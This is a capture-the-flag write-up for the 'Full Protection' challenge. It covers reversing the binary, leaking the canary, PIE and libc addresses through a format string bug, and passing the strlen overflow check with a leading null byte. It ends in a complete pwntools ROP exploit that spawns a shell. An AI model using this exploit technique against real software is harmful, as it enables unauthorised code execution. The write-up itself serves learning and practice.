# Full Protection

Disclaimer: This is a writeup of a challenge that I haven't done remotely, due to issues with how different local and remote were. I have finished it locally, and this is what the writeup goes over

### Protections

From the name, we can see that a lot of protections are enabled, but let's check what that means. Running checksec:

```text
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

We can see every protection is enabled, obviously. I'll go over what each of them mean:

* `FULL RELRO`: This prevents us from overwriting the GOT table, such as with format strings
* `Canary`: A canary is an 8 \(or 4 on 32 bit\) byte random value placed before the return address, which if overwritten with the wrong value, it wil crash the program
* `NX`: Marks certain areas of memory as non executable, basically preventing the usage of shellcode
* `PIE`: Randomizes the binary base, which functions such as `main`, or gadgets will be affected by

We can also assume that `ASLR` is enabled remotely, so we'll enable it as well. However, there's one more protection I haven't talked about, which is `FORTIFY`

`FORTIFY` is protection that helps fight against buffer overflow and format string exploits, such as preventing `%2$p` being used by `printf` \(`%p.%p...` isn't blocked\), or crashing once you input a length greater than the buffer. We'll go over this in more detail later

### Reversing

```text
│ │       ╎   0x00000850      660fefc0       pxor xmm0, xmm0             ; [14] -r-x section size 658 named .text                                          │ 0x00000810    1 6            sym.imp.gets                                    │
│ │       ╎   0x00000854      53             push rbx                                                                                                      │ 0x000007d0    1 6            sym.imp.strlen                                  │
│ │       ╎   0x00000855      4883ec50       sub rsp, 0x50                                                                                                 │ 0x000007c0    1 6            sym.imp.puts                                    │
│ │       ╎   0x00000859      64488b042528.  mov rax, qword fs:[0x28]                                                                                      │ 0x000007b0    1 6            sym.imp._exit                                   │
│ │       ╎   0x00000862      4889442448     mov qword [var_10h], rax                                                                                      │ 0x00000a70    4 101          sym.__libc_csu_init                             │
│ │       ╎   0x00000867      31c0           xor eax, eax                                                                                                  │ 0x00000850    6 134  -> 127  main                                            │
│ │       ╎   0x00000869      0f290424       movaps xmmword [rsp], xmm0                                                                                    │ 0x00000788    3 23           sym._init                                       │
│ │       ╎   0x0000086d      4889e3         mov rbx, rsp                                                                                                  │ 0x000008e0    1 60           entry.init1                                     │
│ │       ╎   0x00000870      0f29442410     movaps xmmword [var_48h], xmm0                                                                                │ 0x00000830    1 6            sym.imp.setvbuf                                 │
│ │       ╎   0x00000875      0f29442420     movaps xmmword [var_38h], xmm0                                                                                │ 0x000007e0    1 6            sym.imp.__stack_chk_fail                        │
│ │       ╎   0x0000087a      0f29442430     movaps xmmword [var_28h], xmm0                                                                                │ 0x000007f0    1 6            sym.imp._IO_putc                                │
│ │      ┌──< 0x0000087f      eb27           jmp 0x8a8                                                                                                     │ 0x00000800    1 6            sym.imp.alarm                                   │
│        │╎   0x00000881      0f1f80000000.  nop dword [rax]                                                                                               │ 0x00000000    9 459  -> 495  loc.imp._ITM_deregisterTMCloneTable             │
│ │      │╎   ; CODE XREF from main @ 0x8b7                                                                                                                │ 0x00000820    1 6            sym.imp.__printf_chk                            │
│ │     ┌───> 0x00000888      4889de         mov rsi, rbx                                                                                                  │                                                                              │
│ │     ╎│╎   0x0000088b      bf01000000     mov edi, 1                                                                                                    │                                                                              │
│ │     ╎│╎   0x00000890      31c0           xor eax, eax                                                                                                  │                                                                              │
│ │     ╎│╎   0x00000892      e889ffffff     call sym.imp.__printf_chk   ;[1]                                                                              │                                                                              │
│ │     ╎│╎   0x00000897      488b35720720.  mov rsi, qword [obj.stdout]    ; obj.__TMC_END                                                                │                                                                              │
│ │     ╎│╎                                                              ; [0x201010:8]=0                                                                  │──────────────────────────────────────────────────────────────────────────────┐
│ │     ╎│╎   0x0000089e      bf0a000000     mov edi, 0xa                                                                                                  │[X]   Symbols (isq)                                                [Cache] On │
│ │     ╎│╎   0x000008a3      e848ffffff     call sym.imp._IO_putc       ;[2]                                                                              │ 0x00201010 8 stdout                                                          │
│ │     ╎│╎   ; CODE XREF from main @ 0x87f                                                                                                                │ 0x00201020 8 stdin                                                           │
│ │     ╎└──> 0x000008a8      be40000000     mov esi, 0x40               ; segment.PHDR                                                                    │ 0x00000238 0 .interp                                                         │
│ │     ╎ ╎   0x000008ad      4889df         mov rdi, rbx                                                                                                  │ 0x00000254 0 .note.ABI-tag                                                   │
│ │     ╎ ╎   0x000008b0      e87b010000     call sym.readline           ;[3]                                                                              │ 0x00000274 0 .note.gnu.build-id                                              │
│ │     ╎ ╎   0x000008b5      85c0           test eax, eax                                                                                                 │ 0x00000298 0 .gnu.hash                                                       │
│ │     └───< 0x000008b7      75cf           jne 0x888                                                                                                     │ 0x000002c0 0 .dynsym                                                         │
│ │       ╎   0x000008b9      31c0           xor eax, eax                                                                                                  │ 0x00000458 0 .dynstr                                                         │
│ │       ╎   0x000008bb      488b542448     mov rdx, qword [var_10h]                                                                                      │ 0x00000544 0 .gnu.version                                                    │
│ │       ╎   0x000008c0      644833142528.  xor rdx, qword fs:[0x28]                                                                                      │ 0x00000568 0 .gnu.version_r                                                  │
│ │      ┌──< 0x000008c9      7506           jne 0x8d1                                                                                                     │ 0x000005a8 0 .rela.dyn                                                       │
│ │      │╎   0x000008cb      4883c450       add rsp, 0x50                                                                                                 │ 0x000006b0 0 .rela.plt                                                       │
│ │      │╎   0x000008cf      5b             pop rbx                                                                                                       │ 0x00000788 0 .init                                                           │
│ │      │╎   0x000008d0      c3             ret                                                                                                           │ 0x000007a0 0 .plt                                                            │
│ │      │╎   ; CODE XREF from main @ 0x8c9                                                                                                                │ 0x00000840 0 .plt.got                                                        │
│ └      └──> 0x000008d1      e80affffff     call sym.imp.__stack_chk_fail ;[4] ; void __stack_chk_fail(void)                                              │ 0x00000850 0 .text                                                           │
│         ╎   0x000008d6      662e0f1f8400.  nop word cs:[rax + rax]
```

This is the disassembly of `main`. Key things to point out are:

* This is where the program takes user input:

  ```text
  0x000008a8      be40000000     mov esi, 0x40
  0x000008ad      4889df         mov rdi, rbx
  0x000008b0      e87b010000     call sym.readline
  ```

  We can see here:

```text
mov esi, 0x40
```

That **`0x40`**, or **`64`** is how big the buffer is

* Here we see the use of printf in the program, which can give us the possibility of a `format string` vulnerability

  ```text
  0x00000892      e889ffffff     call sym.imp.__printf_chk
  ```

  However, you can see it looks different. This is due to the `fortify` protection, which has modified the printf function, to make it more secure.

Let's test to see if there's a format string vuln:

```text
%x
bc7f12d0
%p
0x7ffcbc7f12d0
```

And we do, which makes our job of leaking everything we need a lot easier. However, the modified printf gives us an obstacle:

```text
%2$p
*** invalid %N$ use detected ***
Aborted

%n
*** %n in writable segment detected ***
Aborted
```

This can be easily avoided with repeated format strings:

```text
%p|%p|%p|%p|%p
0x7ffd0386b510|0x10|0x7ffd0386b510|(nil)|0x70257c70257c7025
```

* After the readline, there's a jump back in main, depending on what's in `eax`:

```text
0x000008b0      e87b010000     call sym.readline
0x000008b5      85c0           test eax, eax
0x000008b7      75cf           jne 0x888
```

Also, after readline, what's stored in `eax` is the length of the string, more on that later. So basically, if the length is 0, the program will terminate, otherwise it'll keep running:

```text
aaaa
aaaa
bb
bb

sasha@kalivm:~/OtherCTFs/asis/full_protection_distfiles$
```

### Leaking with format strings

With format strings, we need to leak:

* canary
* binary base \(`PIE`\)
* libc

Since we can't use `%[num]$p`, we need to repeat `%p|`, a maximum of 21 times \(length of 63\), as anymore would cause it to crash:

```bash
$ python -c "print '%p|' * 21"
%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|
```

```text
%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|
0x7fffffffe130|0x10|0x7fffffffe130|(nil)|0x70257c70257c7025|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|0x7c70257c70257c|0x7fffffffe260|0x634fd53113874a00|(nil)|0x7ffff7e18e0b|(nil)|0x7fffffffe268|0x100040000|0x555555554850|(nil)|
```

Looking at the leaks:

* `0x634fd53113874a00` looks like a canary, because it starts with a null byte, looks random, and isn't a valid address
* `0x555555554850` looks like a `pie` address, as they'll usually start with `0x55...`
* `0x7ffff7e18e0b` looks like `libc` address, lets check in `gdb`

  ```text
  gdb-peda$ x 0x7ffff7e18e0b
  0x7ffff7e18e0b <__libc_start_main+235>: 0x48000171aee8c789
  ```

And surely enough, it leaks `__libc_start_main+235`. To find regular `__libc_start_main`, we'll subtract `0xeb`, as `235` is equal to `0xeb`

In our script, we'll assign everything as follows:

```text
p.sendline("%p|" * 21)
leak = p.clean(0.2).split(b"|")

canary = int(leak[13],16)
pie = int(leak[19], 16) - 0x850
__libc_start_main = int(leak[15], 16) - 0xeb
```

### Gathering components

For our exploit, we will be doing a classic rop exploit. Since it's 64 bit, we need to use gadgets to call `sytem` with args. This is what our exploit will look like:

* padding up to canary
* canary
* padding up to return pointer
* `pop rdi; ret` gadget, to pop our arg into `rdi`
* `/bin/sh`, which is our arg
* `system`, the function we'll call

First, we'll find the libc base. With pwntools, we can create an ELF object for my libc version, making it easier to to use offsets:

```python
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.30.so")
```

And we'll use this to get the offset of `__libc_start_main`, and then find the libc base:

```python
libc_base = __libc_start_main - libc.symbols["__libc_start_main"]
```

And then we can use this to find `system`, and `/bin/sh`:

```python
system = libc_base + libc.symbols["system"]
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
```

Next, we need to find the address of `pop rdi; ret`. We'll use `ROPgadget.py` to do so:

```text
0x0000000000000ad3 : pop rdi ; ret
```

Using the binary base we leaked earlier, we can find the address of `pop rdi; ret`:

```python
POP_RDI = pie + 0xad3
```

Lastly, the offset we use will be `72`, as the buffer size is `64`, then the base pointer afterwards is `8` bytes long

Now we should everything we need

### More fortify problems

However, this on it's own isn't going to work, as in `readline`, there's an extra protection protecting against buffer overflow. What it does is check the length of the input against the buffer size that was assigned. If we enter a input of length 63, we are fine, however once we go 64 and above, we'll get this error:

```text
$ python -c "print 'a' * 64" | ./chall
[FATAL] Buffer Overflow
```

So, we're going to have to get a bit creative here. Lets disassemble `readline`, and see what;'s going on:

```text
│ │           0x00000a30      55             push rbp                                                                                                      │ 0x00000a20    1 10           entry.init0                                     │
│ │           0x00000a31      53             push rbx                                                                                                      │ 0x00000ae0    1 2            sym.__libc_csu_fini                             │
│ │           0x00000a32      31c0           xor eax, eax                                                                                                  │ 0x00000ae4    1 9            sym._fini                                       │
│ │           0x00000a34      4889fb         mov rbx, rdi                ; arg1                                                                            │ 0x00000a30    3 59           sym.readline                                    │
│ │           0x00000a37      89f5           mov ebp, esi                ; arg2                                                                            │ 0x00000810    1 6            sym.imp.gets                                    │
│ │           0x00000a39      4883ec08       sub rsp, 8                                                                                                    │ 0x000007d0    1 6            sym.imp.strlen                                  │
│ │           0x00000a3d      e8cefdffff     call sym.imp.gets           ;[1] ; char *gets(char *s)                                                        │ 0x000007c0    1 6            sym.imp.puts                                    │
│ │           0x00000a42      4889df         mov rdi, rbx                ; const char *s                                                                   │ 0x000007b0    1 6            sym.imp._exit                                   │
│ │           0x00000a45      e886fdffff     call sym.imp.strlen         ;[2] ; size_t strlen(const char *s)                                               │ 0x00000a70    4 101          sym.__libc_csu_init                             │
│ │           0x00000a4a      39e8           cmp eax, ebp                                                                                                  │ 0x00000850    6 134  -> 127  main                                            │
│ │       ┌─< 0x00000a4c      7d07           jge 0xa55                                                                                                     │ 0x00000788    3 23           sym._init                                       │
│ │       │   0x00000a4e      4883c408       add rsp, 8                                                                                                    │ 0x000008e0    1 60           entry.init1                                     │
│ │       │   0x00000a52      5b             pop rbx                                                                                                       │ 0x00000830    1 6            sym.imp.setvbuf                                 │
│ │       │   0x00000a53      5d             pop rbp                                                                                                       │ 0x000007e0    1 6            sym.imp.__stack_chk_fail                        │
│ │       │   0x00000a54      c3             ret                                                                                                           │ 0x000007f0    1 6            sym.imp._IO_putc                                │
│ │       │   ; CODE XREF from sym.readline @ 0xa4c                                                                                                        │ 0x00000800    1 6            sym.imp.alarm                                   │
│ │       └─> 0x00000a55      488d3d980000.  lea rdi, qword str.FATAL__Buffer_Overflow    ; 0xaf4 ; "[FATAL] Buffer Overflow" ; const char *s              │ 0x00000000    9 459  -> 495  loc.imp._ITM_deregisterTMCloneTable             │
│ │           0x00000a5c      e85ffdffff     call sym.imp.puts           ;[3] ; int puts(const char *s)                                                    │ 0x00000820    1 6            sym.imp.__printf_chk                            │
│ │           0x00000a61      bf01000000     mov edi, 1                  ; int status                                                                      │                                                                              │
│ └           0x00000a66      e845fdffff     call sym.imp._exit          ;[4] ; void _exit(int status)                                                     │                                                                              │
│             0x00000a6b      0f1f440000     nop dword [rax + rax]
```

Here, we see input is taken with `gets`:

```text
0x00000a3d      e8cefdffff     call sym.imp.gets
```

And it's length is checked with `strlen`:

```text
0x00000a45      e886fdffff     call sym.imp.strlen
```

This will store the length of the input in `eax`. Then, it's compared to `ebp`, which stores the length of the buffer:

```text
0x00000a4a      39e8           cmp eax, ebp
0x00000a4c      7d07           jge 0xa55
```

If it's greater than or equal to 64, it jumps past ret, and crashes. This is also where the 'length in eax' comes from after readline. So, we have two length issues to bypass:

* Preventing the `[FATAL] Buffer overflow` error, by making it think the length is less than 64
* Breaking out of the loop, so we can reach ret, and trigger the exploit. To do this, it needs to think the length is 0

Luckily, we can bypass both of these very simply, with the use of a null byte

### Bypassing length checking

Say we have a buffer that starts at `0x40000000`, and that we called `gets`, which stores our input there, and inputted `aaaa`. Memory would look like this:

```text
...
0x40000000 | "aaaa"
0x40000004 | ""
...
```

Then, we call `strlen`, to check, the length of this, so:

```text
...
0x40000000 | "aaaa"    <=== strlen checks this
0x40000004 | ""
...
```

And will return `4`. However, memory separates strings with null bytes. So for example:

```text
0x40000000 | "aaaa[\x00]bbbb"
```

Would look more like this:

```text
...
0x40000000 | "aaaa"
0x40000005 | "bbbb"
...
```

So, if we inputted `aaaa\x00bbbb`, the strlen would return the length of just `aaaa`, which is 4. So, what happens if we put a null byte at the start of our input?

Well, if we inputted `\x00aaaabbbb`, this would happen:

```text
...
0x40000000 | ""         <=== strlen checks this
0x40000001 | "aaaabbbb"
...
```

So, `strlen` would return a length of 0, and we'd be able to overwrite the buffer, canary and return pointer as normal

### Final Exploit

So, here's my final exploit:

```python
from pwn import *
from sys import argv

e = ELF("./chall")

try:    # Remote
    host = argv[1].split(":")
    p = remote(host[0], host[1])
    libc = ELF("./libc-2.27.so")    # Remote libc
except:    # Local
    p = e.process()
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.30.so")    # My libc

p.sendline("%p|" * 21)        # Leak the stack
leak = p.clean(0.2).split(b"|")

canary = int(leak[13],16)    # Get canary
log.info(f"canary: {hex(canary)}")

pie = int(leak[19], 16) - 0x850    # Get binary base
log.info(f"PIE: {hex(pie)}")

__libc_start_main = int(leak[15], 16) - 0xeb    # Get __libc_start_main
log.info(f"__libc_start_main: {hex(__libc_start_main)}")
libc_base = __libc_start_main - libc.symbols["__libc_start_main"]    # Get libc base
log.info(f"libc base: {hex(libc_base)}")

POP_RDI = pie + 0xad3

system = libc_base + libc.symbols["system"]
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))

payload = b"\x00"    # Trick strlen
payload += b"a" * 63    # Pad upto base pointer
payload += b"b" * 8    # Overwrite base pointer
payload += p64(canary)    # Overwrite canary
payload += b"c" * 8    # Pad upto return pointer
payload += p64(POP_RDI)    # Pops arg into rdi
payload += p64(binsh)    # Arg
payload += p64(system)    # Function to call

p.sendline(payload)

p.interactive()
```

